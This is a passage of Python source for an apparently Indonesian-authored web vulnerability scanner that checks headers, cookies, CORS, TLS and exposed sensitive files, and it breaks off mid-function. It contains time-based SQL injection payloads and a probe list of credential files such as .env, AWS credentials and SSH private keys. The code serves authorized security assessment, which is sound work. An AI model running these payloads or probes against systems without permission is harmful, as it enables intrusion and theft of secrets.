"""
Vuln engine v3 — enterprise-oriented, stdlib only. AUTHORIZED TESTING ONLY.

Upgrade dari v2 (lihat AUDIT.md & UPGRADE_NOTES.md):
- Marker unik PER SCAN (bukan per proses), baseline soft-404 untuk menekan false positive.
- Crawler beneran (crawler.py): form, JS endpoint, robots/sitemap -> parameter NYATA yang diuji.
- Verifikasi berlapis: content signature untuk file sensitif, SQLi error+boolean+time,
  XSS multi-konteks, SSTI, traversal/LFI, command injection, CRLF, SSRF (metadata+oracle).
- Setiap finding punya confidence: confirmed | probable | candidate + location & param.
  Kandidat CVE berbasis versi DILABELI candidate — bukan klaim terkonfirmasi.
- Check baru: API exposure (Swagger/OpenAPI/GraphQL introspection), CSRF form,
  JWT analysis, unauthenticated service API (Docker/Elasticsearch/kubelet),
  kualitas CSP/HSTS, cookie per-item (Secure/HttpOnly/SameSite).
"""
import base64
import hashlib
import hmac as hmac_mod
import json
import re
import secrets as pysecrets
import time
from urllib.parse import quote, urlparse

from netclient import Client, similarity
import netclient
import crawler as crawl_mod
from scanners import COMMON_PORTS, tcp_scan, tcp_scan_detailed, ssl_audit, resolve_host

SEV_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

SQL_ERRORS = [
    "you have an error in your sql syntax", "mysql_fetch", "mysql_num_rows",
    "ora-00933", "ora-01756", "ora-00942", "sqlite3.", "sqlite error",
    "pg_query", "psql: error", "postgresql error", "unclosed quotation mark",
    "odbc microsoft access", "warning: mysql", "unterminated string",
    "quoted string not properly terminated", "microsoft ole db provider for sql server",
    "invalid object name", "com.mysql.jdbc", "org.postgresql.util.psqlexception",
    "django.db.utils", "sqlalchemy.exc", "syntax error at or near",
]
SQL_TIME_PAYLOADS = ["1' AND SLEEP(3)-- -", "1 AND SLEEP(3)",
                     "1'; SELECT pg_sleep(3)-- -", "1' WAITFOR DELAY '0:0:3'-- -",
                     "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)"]


def F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
      confidence="probable", location="", param="", origin="active"):
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": origin}


class Ctx:
    def __init__(self, target, opts, log_list, job_cancel=None):
        self.target = target
        self.client = Client(target, timeout=float(opts.get("timeout", 6.0)),
                             extra_headers=opts.get("headers") or {},
                             cookie=opts.get("cookie", ""),
                             proxy=opts.get("proxy", ""))
        self._deadline = None
        self.marker = pysecrets.token_hex(5)
        self.num_a = pysecrets.randbelow(80) + 11
        self.num_b = pysecrets.randbelow(8) + 3
        self.log = log_list
        self._cancel = job_cancel
        self.client.should_continue = lambda: not self.cancelled()
        self._surf = None
        self._soft404 = None
        self.technologies = []
        self.opts = opts

    def L(self, msg):
        if self.log is not None:
            self.log.append(msg)

    def cancelled(self):
        if self._cancel and self._cancel():
            return True
        return bool(getattr(self, "_deadline", None)
                    and time.time() > self._deadline)

    def soft404(self):
        if self._soft404 is None:
            self._soft404 = self.client.get(f"/ptk-{self.marker}-nonexistent-{self.num_a}")
        return self._soft404

    def is_missing(self, resp):
        if resp.status in (404, 410):
            return True
        base = self.soft404()
        if base.status == resp.status and resp.body:
            if similarity(resp.body, base.body) > 0.92:
                return True
        return False

    def surface(self, full=True):
        # Cache dibedakan: crawl terbatas (pasif, 1 halaman) TIDAK boleh mengunci
        # crawl penuh yang diminta check aktif belakangan di scan yang sama.
        if self._surf is None or (full and not getattr(self, "_surf_full", False)):
            self._surf = crawl_mod.crawl(
                self.client, log=self.L,
                max_pages=int(self.opts.get("max_pages", 30)) if full else 1,
                cancelled=self.cancelled)
            self._surf_full = full
            try:
                self._surf.param_urls.sort()
                self._surf.js_endpoints.sort()
            except Exception:
                pass
            extra = self.opts.get("headless_endpoints")
            if extra and not getattr(self, "_headless_merged", False):
                for e in extra:
                    if e not in self._surf.js_endpoints:
                        self._surf.js_endpoints.append(e)
                    if "?" in e and e not in self._surf.param_urls:
                        self._surf.param_urls.append(e)
                self._headless_merged = True
                self.L(f"  [headless] {len(extra)} rendered-DOM endpoints merged into surface")
        return self._surf

    _PATH_OK = re.compile(r"^/[A-Za-z0-9._~!$&'()*+,;=:@%/-]*$")
    _NAME_OK = re.compile(r"^[A-Za-z_][A-Za-z0-9_.\[\]-]{0,40}$")
    _STATIC_BASE = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                    ".map", ".woff", ".woff2", ".ttf", ".mp4", ".pdf")

    @classmethod
    def _sane_target(cls, base, name):
        """Tolak target parameter sampah hasil salah-urai konten (v3.2.1):
        path berisi kurung/kutip/spasi/backslash atau terlalu panjang dan nama
        param yang bukan identifier wajar adalah fragmen kode, bukan parameter."""
        if not base or len(base) > 160 or not cls._PATH_OK.match(base):
            return False
        if any(ch in base for ch in '()[]{}<>"`\\ ') or "&&" in base or ");" in base:
            return False
        if base.lower().endswith(cls._STATIC_BASE):
            return False
        return bool(cls._NAME_OK.match(name or ""))

    def param_targets(self, limit=14):
        """Target parameter untuk uji aktif. Tiga sumber (URL berquery dari
        crawl, form, tebakan baku) digabung ROUND-ROBIN — bukan berurutan —
        supaya limit tidak memotong habis satu jenis sumber (dulu: 13 URL GET
        pertama memenuhi limit 14 dan semua form POST, termasuk endpoint XML,
        tidak pernah teruji — miss yang ditangkap battery v3.4)."""
        surf = self.surface(full=True)
        seen = set()
        gets, forms_l, guesses = [], [], []
        for pq in surf.param_urls:
            base, names = crawl_mod.params_of(pq)
            for n in names[:3]:
                if not self._sane_target(base, n):
                    continue
                k = (base, n, "GET")
                if k not in seen:
                    seen.add(k); gets.append((base, n, "GET", pq))
        for form in surf.forms:
            for n in form["inputs"][:4]:
                if not self._sane_target(form["action"], n):
                    continue
                k = (form["action"], n, form["method"])
                if k not in seen:
                    seen.add(k); forms_l.append((form["action"], n, form["method"], None))
        for pq in crawl_mod.GUESS_PARAM_URLS:
            base, names = crawl_mod.params_of(pq)
            r = self.client.get(pq)
            if r.status and not self.is_missing(r):
                for n in names:
                    if not self._sane_target(base, n):
                        continue
                    k = (base, n, "GET")
                    if k not in seen:
                        seen.add(k); guesses.append((base, n, "GET", pq))
            if len(gets) + len(forms_l) + len(guesses) >= limit * 2:
                break
        out = []
        srcs = [gets, forms_l, guesses]
        idx = [0, 0, 0]
        while len(out) < limit:
            progressed = False
            for si, src in enumerate(srcs):
                if idx[si] < len(src) and len(out) < limit:
                    out.append(src[idx[si]]); idx[si] += 1; progressed = True
            if not progressed:
                break
        return out

    def req_param(self, base, pname, value, method="GET", orig_qs=None):
        if method == "POST":
            return self.client.post(base, data=f"{pname}={quote(value, safe='')}")
        params = {}
        if orig_qs and "?" in orig_qs:
            for pair in orig_qs.split("?", 1)[1].split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1); params[k] = v
        params[pname] = quote(value, safe="")
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        return self.client.get(base, params=qs)


# ------------------------------------------------------------ passive checks

def c_version_disclosure(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    server = r.hdr("server")
    if server and any(c.isdigit() for c in server):
        add(F("LOW", f"Server version disclosure: {server}",
              "Versi software terpapar — memudahkan pencarian exploit spesifik.",
              evidence=server, cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
              cvss=3.1, remed='Hide the version in headers (server_tokens off, etc.).',
              confidence="confirmed", location="/"))
    pb = r.hdr("x-powered-by")
    if pb:
        add(F("LOW", f"X-Powered-By disclosure: {pb}",
              "Teknologi backend terpapar.", evidence=pb, cwe="CWE-200",
              owasp="A05:2021", cvss=3.1, remed='Remove the X-Powered-By header.',
              confidence="confirmed", location="/"))


def _tech_fingerprint(ctx):
    """Profil teknologi & integrasi dari artefak homepage (techdb v3.5):
    server, runtime, framework, CMS, library JS, analytics, chat, payment,
    captcha, auth — setiap entri membawa evidence penemunya."""
    if ctx.technologies:
        return ctx.technologies
    import techdb
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    body = r.body or ""
    srcs = re.findall(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""", body, re.I)
    # Halaman error (soft-404) ditambang untuk sidik jari database/framework/
    # OS — pesan error bocor adalah sumber stack yang tidak terlihat di
    # homepage (v3.8). Respons ghost yang sama dipakai ulang cache Ctx.
    try:
        error_body = ctx.soft404().body or ""
    except Exception:
        error_body = ""
    techs = techdb.profile(list(r.headers), body, srcs, error_body=error_body)
    gen = r.hdr("x-generator")
    if gen and not any(t["name"] == gen[:40] for t in techs):
        techs.append({"name": gen[:40], "category": "CMS", "version": "",
                      "evidence": "X-Generator", "source": "header"})
    # Verifikasi aktif (v3.7): stack yang terdeteksi dari artefak pasif
    # dibuktikan dengan probe ke endpoint khasnya — klaim teknologi naik
    # kelas dari "fingerprint" menjadi "terverifikasi berjalan".
    verified_n = 0
    for t in techs:
        spec = techdb.verify_spec(t["name"])
        if not spec or verified_n >= 3:
            continue
        try:
            vr = ctx.client.get(spec[0])
        except Exception:
            continue
        if vr.status == 200 and vr.body:
            ok, ver = techdb.parse_verify(t["name"], vr.body)
            if ok:
                t["verified"] = True
                t["confidence"] = "verified"
                t["evidence"] = f"{t['evidence']}; actively verified via {spec[0]}"
                if ver:
                    t["version"] = ver
                verified_n += 1
                ctx.L(f"  [tech-verify] {t['name']} CONFIRMED via {spec[0]}")
    # Probe komponen deployment/API (v1.1): endpoint khas milik tool itu
    # sendiri (registry /v2/, K8s /version, Portainer, Argo CD, Jenkins
    # /login, OpenAPI, GraphQL) — klaim hanya dari signature produk yang
    # terparse, status 200 telanjang tidak pernah cukup.
    for path, pname, pcat, parser, method, pbody in techdb.COMPONENT_PROBES:
        try:
            if method == "POST":
                pr = ctx.client.post(path, data=json.dumps(pbody),
                                     headers={"Content-Type": "application/json"})
            else:
                pr = ctx.client.get(path)
        except Exception:
            continue
        if not pr or (pr.status not in (200, 401) and method == "GET"):
            continue
        hit, pver = parser(list(pr.headers), pr.body or "")
        if not hit:
            continue
        if pname == "OpenID Connect (OIDC)":
            # Issuer ber pola /realms/<realm> = sidik jari Keycloak: klaim
            # produk spesifiknya, bukan hanya protokol generik.
            try:
                _iss = json.loads(pr.body or "").get("issuer", "")
            except Exception:
                _iss = ""
            if "/realms/" in _iss:
                pname, pcat = "Keycloak", "Auth/SSO"
                ev_note = f"OIDC issuer {_iss[:80]}"
                cur = next((t for t in techs if t["name"] == "Keycloak"), None)
                if cur is None:
                    techs.append({"name": "Keycloak", "category": "Auth/SSO",
                                  "version": "", "evidence": ev_note,
                                  "source": "probe",
                                  "evidence_list": [ev_note],
                                  "sources": ["probe"],
                                  "detail": techdb.DETAILS.get("Keycloak", ""),
                                  "confidence": "verified", "verified": True,
                                  "version_confidence": ""})
                else:
                    cur["verified"] = True
                    cur["confidence"] = "verified"
                ctx.L(f"  [tech-probe] Keycloak CONFIRMED via OIDC issuer {ev_note}")
                continue
        ev = f"probe {path}: product signature confirmed"
        cur = next((t for t in techs if t["name"] == pname), None)
        if cur is None:
            techs.append({"name": pname, "category": pcat, "version": pver,
                          "evidence": ev, "source": "probe",
                          "evidence_list": [ev], "sources": ["probe"],
                          "detail": techdb.DETAILS.get(pname, ""),
                          "confidence": "verified", "verified": True,
                          "version_confidence": "verified" if pver else ""})
        else:
            cur["verified"] = True
            cur["confidence"] = "verified"
            if pver:
                cur["version"] = pver
                cur["version_confidence"] = "verified"
            if ev not in cur.get("evidence_list", []):
                cur.setdefault("evidence_list", []).append(ev)
        ctx.L(f"  [tech-probe] {pname} {pver} CONFIRMED via {path}")
    ctx.technologies = techs
    for t in techs:
        ctx.L(f"  [tech] {t['name']} {t.get('version', '')} ({t.get('category', '')})".rstrip())
    return techs


def c_tech_fingerprint(ctx, add):
    techs = _tech_fingerprint(ctx)
    for t in techs:
        if t.get("version"):
            add(F("INFO", f"Technology detected: {t['name']} {t['version']}",
                  'Passive fingerprint from headers/HTML. Exact versions make it easier for an attacker to map relevant CVEs — CVE candidates (if any) are reported separately as candidates, not confirmed.',
                  evidence=t["evidence"], cwe="CWE-200", owasp="A05:2021", cvss=0.0,
                  remed='Hide the version where possible; ensure this version is patched.',
                  confidence="confirmed", location="/"))
    if techs:
        ringkas = "; ".join(
            f"{t['name']}{' ' + t['version'] if t.get('version') else ''} [{t.get('category', '')}]"
            for t in techs)
        add(F("INFO", f"Technology & integration profile: {len(techs)} detected",
              'The stack and third-party services installed/integrated in this application, identified from response artifacts (headers, cookies, HTML, scripts) with per-item evidence in the scan result (tech_profile). Every integration is attack surface and supply chain that must be inventoried.',
              evidence=ringkas[:600], cwe="CWE-200", owasp="A05:2021", cvss=0.0,
              remed='Inventory and regularly patch all components, including JS libraries and third-party services.',
              confidence="confirmed", location="/"))


def c_security_headers(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    if not r.ok:
        return
    present = {k.lower() for k, _ in r.headers}
    rules = [("strict-transport-security", "MEDIUM", "CWE-319", 5.9,
              'Enable HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains'),
             ("content-security-policy", "MEDIUM", "CWE-79", 5.4,
              'Add a CSP that restricts script/style sources.'),
             ("x-frame-options", "LOW", "CWE-1021", 4.3,
              'Set X-Frame-Options: DENY/SAMEORIGIN or frame-ancestors in CSP.'),
             ("x-content-type-options", "LOW", "CWE-430", 3.1,
              "Set X-Content-Type-Options: nosniff."),
             ("referrer-policy", "LOW", "CWE-200", 2.7,
              "Set Referrer-Policy: strict-origin-when-cross-origin."),
             ("permissions-policy", "LOW", "CWE-693", 2.7,
              'Restrict browser APIs via Permissions-Policy.')]
    https = ctx.client.scheme == "https"
    for name, sev, cwe, cvss, remed in rules:
        if name == "strict-transport-security" and not https:
            continue
        if name not in present:
            add(F(sev, f"Security header not set: {name}",
                  f"Header {name} not found in the response. {remed}",
                  cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
                  remed=remed, confidence="confirmed", location="/"))
    csp = r.hdr("content-security-policy")
    if csp:
        weak = [w for w in ("unsafe-inline", "unsafe-eval") if w in csp]
        if "'*'" in csp or re.search(r"(script-src|default-src)\s+[^;]*\*", csp) or weak:
            add(F("LOW", 'Weak Content-Security-Policy',
                  'CSP is present but allows ' +
                  (", ".join(weak) if weak else "wildcard") +
                  " — its XSS protection is greatly reduced.",
                  evidence=csp[:160], cwe="CWE-79", owasp="A05:2021", cvss=3.1,
                  remed='Tighten the CSP: avoid unsafe-inline/unsafe-eval & wildcards for script-src.',
                  confidence="confirmed", location="/"))
    hsts = r.hdr("strict-transport-security")
    if hsts and https:
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) < 31536000:
            add(F("LOW", f"Weak HSTS max-age ({m.group(1)} seconds)",
                  'A max-age below 1 year gives a larger downgrade window.',
                  evidence=hsts[:120], cwe="CWE-319", owasp="A02:2021 Cryptographic Failures",
                  cvss=3.1, remed='Raise max-age to >= 31536000 and add includeSubDomains.',
                  confidence="confirmed", location="/"))


def c_cookie_security(ctx, add):
    r = ctx.surface(full=False).homepage or ctx.client.get("/")
    for raw in r.hdr_all("set-cookie"):
        name = raw.split("=", 1)[0].strip() or '(unnamed)'
        # Parse presisi via http.cookies: atribut dibaca dari morsel, bukan
        # substring pada seluruh header (kata 'httponly' di dalam VALUE cookie
        # tidak lagi menyembunyikan flag yang hilang). Header yang gagal
        # di-parse jatuh ke metode substring lama.
        attrs = None
        try:
            from http.cookies import SimpleCookie
            jar = SimpleCookie()
            jar.load(raw)
            if jar:
                morsel = next(iter(jar.values()))
                # Morsel MEMUAT semua kunci reserved ('' bila tak diset);
                # atribut dianggap ada hanya bila nilainya truthy
                # (flag telanjang tersimpan sebagai True).
                attrs = {k.lower() for k in morsel.keys() if morsel[k]}
                if morsel.key:
                    name = morsel.key
        except Exception:
            attrs = None
        low = raw.lower()
        if attrs is not None:
            has = lambda flag: flag in attrs
        else:
            has = lambda flag: flag in low
        missing = []
        if not has("httponly"):
            missing.append("HttpOnly")
        if ctx.client.scheme == "https" and not has("secure"):
            missing.append("Secure")
        if not has("samesite"):
            missing.append("SameSite")
        if not missing:
            continue
        sev = "MEDIUM" if "HttpOnly" in missing else "LOW"
        add(F(sev, f"Cookie '{name}' missing flags: {', '.join(missing)}",
              'Each cookie is analyzed per item. Missing HttpOnly = cookie readable by JS (amplifies XSS impact); missing Secure = cookie can be sent over HTTP; missing SameSite = larger CSRF surface.',
              evidence=raw[:140], cwe="CWE-1004" if "HttpOnly" in missing else "CWE-614",
              owasp="A05:2021", cvss=5.3 if sev == "MEDIUM" else 3.1,
              remed='Set HttpOnly + Secure (on HTTPS) + SameSite=Lax/Strict on the session cookie.',
              confidence="confirmed", location="/"))


def c_cors(ctx, add):
    evil = "https://evil.example.com"
    surf = ctx.surface(full=False)
    paths = ["/"] + list(surf.js_endpoints)[:2]
    for path in paths:
        r = ctx.client.get(path, headers={"Origin": evil})
        acao = r.hdr("access-control-allow-origin")
        acac = r.hdr("access-control-allow-credentials").lower()
        if acao == evil:
            add(F("HIGH" if acac == "true" else "MEDIUM",
                  f"CORS trusts an arbitrary Origin: {path}",
                  'The server echoes an external Origin in Access-Control-Allow-Origin'
                  + (' WITH credentials — authenticated data can be read by other sites.'
                     if acac == "true" else "."),
                  evidence=f"ACAO={acao}, ACAC={acac or 'absen'}", cwe="CWE-942",
                  owasp="A05:2021", cvss=8.1 if acac == "true" else 5.4,
                  remed="Whitelist origin secara eksplisit; jangan echo Origin.",
                  confidence="confirmed", location=path))
            return
        if acao == "*" and acac == "true":
            add(F("HIGH", f"CORS wildcard with credentials: {path}",
                  'The combination ACAO:* + credentials:true indicates a misconfigured CORS policy.',
                  evidence="ACAO=*, ACAC=true", cwe="CWE-942", owasp="A05:2021", cvss=7.4,
                  remed='Do not combine wildcards with credentials.',
                  confidence="confirmed", location=path))
            return
        r2 = ctx.client.get(path, headers={"Origin": "null"})
        if r2.hdr("access-control-allow-origin") == "null" and \
                r2.hdr("access-control-allow-credentials").lower() == "true":
            add(F("MEDIUM", f"CORS trusts a 'null' Origin + credentials: {path}",
                  'A null Origin can be forged from a sandboxed iframe / redirect.',
                  evidence="ACAO=null, ACAC=true", cwe="CWE-942", owasp="A05:2021",
                  cvss=6.5, remed='Reject a null Origin for credentialed endpoints.',
                  confidence="confirmed", location=path))
            return


def c_tls(ctx, add):
    host = ctx.client.host
    res = ssl_audit(host)
    if not res.get("ok"):
        add(F("INFO", 'TLS could not be audited',
              'Port 443 does not respond or the host has no HTTPS.',
              remed='Verify the HTTPS endpoint is reachable and correctly configured, then re-run the scan.',
              confidence="confirmed", location=":443"))
        return
    if res.get("verify_error"):
        add(F("HIGH", 'TLS certificate is not valid for standard clients',
              'Certificate verification against the built-in CA failed — prone to MITM if users are accustomed to ignoring warnings.',
              evidence=res["verify_error"][:160], cwe="CWE-295",
              owasp="A02:2021 Cryptographic Failures", cvss=7.4,
              remed='Use a certificate from a trusted public CA that matches the hostname.',
              confidence="confirmed", location=":443"))
    legacy = res.get("legacy_protocols_enabled") or []
    if legacy:
        add(F("HIGH", f"Deprecated TLS protocol enabled: {', '.join(legacy)}",
              'TLSv1.0/1.1 is prohibited by PCI-DSS and vulnerable to downgrade attacks.',
              evidence=str(legacy), cwe="CWE-327", owasp="A02:2021", cvss=7.4,
              remed='Disable TLS<1.2; use TLSv1.2+ with strong cipher suites.',
              confidence="confirmed", location=":443"))
    cipher = res.get("cipher") or []
    bits = cipher[2] if len(cipher) > 2 else 0
    if bits and bits < 128:
        add(F("MEDIUM", f"Weak TLS cipher ({bits}-bit)",
              'Negotiated cipher below 128-bit.', evidence=str(cipher),
              cwe="CWE-327", owasp="A02:2021", cvss=5.9,
              remed="Disable ciphers <128-bit / RC4 / 3DES.", confidence="confirmed",
              location=":443"))
    exp = res.get("not_after", "")
    if exp:
        import ssl as _ssl
        try:
            t = _ssl.cert_time_to_seconds(exp) - time.time()
            if t < 0:
                add(F("CRITICAL", 'TLS certificate EXPIRED',
                      f"Certificate expired {exp}.", evidence=exp, cwe="CWE-298",
                      owasp="A02:2021", cvss=9.1, remed='Renew the certificate immediately.',
                      confidence="confirmed", location=":443"))
            elif t < 14 * 86400:
                add(F("MEDIUM", 'TLS certificate expires soon (<14 days)',
                      f"Expired {exp}.", evidence=exp, cwe="CWE-298", owasp="A02:2021",
                      cvss=5.3, remed='Renew the certificate.', confidence="confirmed",
                      location=":443"))
        except Exception:
            pass
    san = res.get("san") or []
    host = ctx.client.host
    if san and host not in san and not any(
            s.startswith("*.") and host.endswith(s[1:]) and host.count(".") == s.count(".") + 1
            for s in san):
        add(F("MEDIUM", 'Hostname not covered by the certificate SAN',
              f"Host {host} not present in SAN: {', '.join(san[:6])}",
              evidence=", ".join(san[:6]), cwe="CWE-297", owasp="A02:2021", cvss=5.9,
              remed='Issue a certificate that covers this hostname.',
              confidence="confirmed", location=":443"))


# ------------------------------------------------------------ active: exposure

# path -> (severity, cwe, cvss, remediasi, [regex signature konten — WAJIB cocok salah satu])
SENSITIVE_FILES = {
    "/.env": ("HIGH", "CWE-200", 7.5, 'Application credentials are readable. Remove from the webroot and block at the web server.',
              [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", r"APP_(KEY|ENV|DEBUG)", r"DB_(PASSWORD|HOST|DATABASE)"]),
    "/.env.bak": ("HIGH", "CWE-200", 7.5, 'Remove the .env backup from the webroot.',
                  [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", r"DB_PASSWORD"]),
    "/.env.local": ("HIGH", "CWE-200", 7.5, 'Remove .env.local from the webroot.',
                    [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+"]),
    "/.git/config": ("HIGH", "CWE-538", 7.5, 'Block /.git access at the web server; deploy without .git.',
                     [r"\[core\]", r"\[remote\s"]),
    "/.git/HEAD": ("HIGH", "CWE-538", 7.5, 'Block /.git access at the web server.',
                   [r"ref:\s*refs/"]),
    "/.gitignore": ("LOW", "CWE-200", 3.7, "Informasi struktur repo; blok akses dotfiles.",
                    [r"(?m)^\S+"]),
    "/.svn/entries": ("HIGH", "CWE-538", 7.5, "Blok akses /.svn.", [r"svn", r"dir"]),
    "/backup.sql": ("CRITICAL", "CWE-538", 9.1, 'Public database dump. Remove immediately and rotate credentials.',
                    [r"CREATE TABLE", r"INSERT INTO", r"mysqldump|pg_dump"]),
    "/dump.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                  [r"CREATE TABLE", r"INSERT INTO"]),
    "/database.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                      [r"CREATE TABLE", r"INSERT INTO"]),
    "/db.sql": ("CRITICAL", "CWE-538", 9.1, 'Remove the dump from the webroot.',
                [r"CREATE TABLE", r"INSERT INTO"]),
    "/wp-config.php.bak": ("CRITICAL", "CWE-538", 9.8, 'Config backup contains DB credentials. Remove and rotate.',
                           [r"DB_(NAME|PASSWORD|USER)", r"define\s*\("]),
    "/wp-config.php~": ("CRITICAL", "CWE-538", 9.8, 'Remove editor backup files and rotate credentials.',
                        [r"DB_(NAME|PASSWORD|USER)"]),
    "/config.php.bak": ("HIGH", "CWE-538", 7.5, 'Remove the config backup and rotate credentials.',
                        [r"password|passwd|db_|database"]),
    "/phpinfo.php": ("HIGH", "CWE-200", 7.5, 'Remove phpinfo from production.',
                     [r"phpinfo\(\)", r"PHP Version\s", r"<title>phpinfo"]),
    "/info.php": ("MEDIUM", "CWE-200", 5.3, 'Remove the PHP info page from production.',
                  [r"phpinfo\(\)", r"PHP Version\s"]),
    "/server-status": ("LOW", "CWE-200", 5.3, 'Restrict to localhost/ACL.',
                       [r"Apache Status", r"Total accesses", r"Server uptime"]),
    "/server-info": ("LOW", "CWE-200", 5.3, 'Restrict to localhost/ACL.',
                     [r"Apache Status|Server Information", r"Configuration Phase Participation"]),
    "/.DS_Store": ("LOW", "CWE-538", 3.7, 'Remove it; add it to .gitignore.', [r"Bud1"]),
    "/composer.json": ("LOW", "CWE-200", 5.3, 'Do not expose in production.',
                       [r'"(require|autoload|name)"\s*:']),
    "/composer.lock": ("LOW", "CWE-200", 5.3, 'Discloses the exact dependency version.',
                       [r'"packages"\s*:', r'"content-hash"']),
    "/package.json": ("LOW", "CWE-200", 5.3, 'Do not expose in production.',
                      [r'"(dependencies|devDependencies|name)"\s*:']),
    "/package-lock.json": ("LOW", "CWE-200", 5.3, 'Discloses the exact dependency version.',
                           [r'"lockfileVersion"']),
    "/WEB-INF/web.xml": ("HIGH", "CWE-200", 7.5, 'Block WEB-INF in the servlet container.',
                         [r"<web-app", r"<servlet"]),
    "/.htpasswd": ("HIGH", "CWE-538", 7.5, 'Credential file; block .ht* access.',
                   [r"(?m)^[A-Za-z0-9_.-]+:\$"]),
    "/debug/vars": ("HIGH", "CWE-489", 8.2, 'Disable debug endpoints in production.',
                    [r"(?i)debug|request|environ|config"]),
    "/actuator/env": ("CRITICAL", "CWE-200", 9.8, 'Spring Boot actuator env leaks credentials. Disable/secure the endpoint.',
                      [r"propertySources|activeProfiles|systemEnvironment"]),
    "/actuator/heapdump": ("CRITICAL", "CWE-200", 9.8, 'A heapdump can contain live credentials. Disable the endpoint.',
                           []),  # tanpa signature: dinilai dari status+ukuran+baseline
    "/actuator/configprops": ("HIGH", "CWE-200", 7.5, "Matikan/secure actuator configprops.",
                              [r"configurationProperties|beans|contexts"]),
    "/adminer.php": ("HIGH", "CWE-425", 8.8, 'Remove Adminer from production.',
                     [r"Adminer", r"Login\s*-"]),
    "/elmah.axd": ("HIGH", "CWE-532", 7.5, "Secure error log endpoint.",
                   [r"ELMAH|Error Log"]),
    "/.aws/credentials": ("CRITICAL", "CWE-200", 9.8, 'AWS credentials exposed — rotate IMMEDIATELY.',
                          [r"aws_access_key_id", r"\[default\]|\[profile"]),
    "/id_rsa": ("CRITICAL", "CWE-200", 9.8, 'Private key exposed — rotate IMMEDIATELY.',
                [r"BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY"]),
    "/.ssh/id_rsa": ("CRITICAL", "CWE-200", 9.8, 'Private key exposed — rotate IMMEDIATELY.',
                     [r"BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY"]),
    "/docker-compose.yml": ("MEDIUM", "CWE-200", 5.3, 'Discloses service architecture and environment.',
                            [r"(?m)^services\s*:", r"(?m)^\s+image\s*:"]),
    "/.gitlab-ci.yml": ("LOW", "CWE-200", 3.7, 'Discloses the CI pipeline.',
                        [r"(?m)^(stages|image|script)\s*:"]),
    "/robots.txt.bak": ("LOW", "CWE-200", 3.7, 'Remove the backup file.', [r"User-agent"]),
    # --- tambahan enterprise (v3.1) ---
    "/backup.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site backup archive — remove it and treat its contents as leaked.',
                    [r"^PK\x03\x04"]),
    "/site.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site archive — remove from the webroot.',
                  [r"^PK\x03\x04"]),
    "/www.zip": ("CRITICAL", "CWE-538", 9.1, 'Public site archive — remove from the webroot.',
                 [r"^PK\x03\x04"]),
    "/db.zip": ("CRITICAL", "CWE-538", 9.1, 'Public database archive — remove it and rotate credentials.',
                [r"^PK\x03\x04"]),
    "/archive.zip": ("HIGH", "CWE-538", 7.5, 'Public archive — remove from the webroot.',
                     [r"^PK\x03\x04"]),
    "/web.config": ("HIGH", "CWE-200", 7.5, 'web.config leaks the connection string and IIS configuration.',
                    [r"<configuration", r"connectionStrings|system\.web"]),
    "/.bash_history": ("CRITICAL", "CWE-200", 9.1, 'Shell history exposed — remove it and audit its contents.',
                       [r"(?m)^\s*(sudo|cd|ls|cat|ssh|curl|wget|mysql)\b"]),
    "/settings.py": ("HIGH", "CWE-200", 7.5, 'Django settings exposed (SECRET_KEY/DB). Rotate the secret.',
                     [r"SECRET_KEY|DATABASES\s*=|DJANGO"]),
    "/config.yml": ("MEDIUM", "CWE-200", 5.3, 'Configuration file exposed.',
                    [r"(?m)^(database|production|development|adapter)\s*:"]),
    "/actuator/prometheus": ("MEDIUM", "CWE-200", 5.3, 'Internal metrics exposed.',
                             [r"# HELP |# TYPE "]),
    "/actuator/metrics": ("MEDIUM", "CWE-200", 5.3, 'Internal metrics exposed.',
                          [r'"names"\s*:\s*\[|jvm\.|process\.']),
    "/.env.save": ("HIGH", "CWE-200", 7.5, 'Remove the .env backup from the webroot.',
                   [r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+"]),
    "/application.yml": ("MEDIUM", "CWE-200", 5.3, 'Spring configuration exposed.',
                         [r"(?m)^(spring|server|datasource)\s*:"]),
    "/.npmrc": ("HIGH", "CWE-200", 7.5, 'npm registry token potentially leaked — rotate it.',
                [r"_authToken|registry\s*="]),
}


def c_sensitive_files(ctx, add):
    ctx.soft404()  # hangatkan baseline dulu
    for path, (sev, cwe, cvss, remed, sigs) in SENSITIVE_FILES.items():
        if ctx.cancelled():
            return
        r = ctx.client.get(path)
        if r.status != 200 or not r.body or ctx.is_missing(r):
            continue
        matched = None
        for sig in sigs:
            if re.search(sig, r.body):
                matched = sig
                break
        if sigs and not matched:
            ctx.L(f"  [filter] {path} 200 but signature does not match — treated as soft-404/FP, skipped")
            continue
        if not sigs and len(r.body) < 1024:
            continue  # heapdump asli besar; respons kecil tanpa signature = tidak meyakinkan
        add(F(sev, f"Sensitive file exposed: {path}",
              f"The endpoint responded 200 and the content PASSED signature verification ({matched or 'size+baseline'}), not just a 200 status. {remed}",
              evidence=f"HTTP 200, {len(r.body)} bytes, signature: {matched or '-'}",
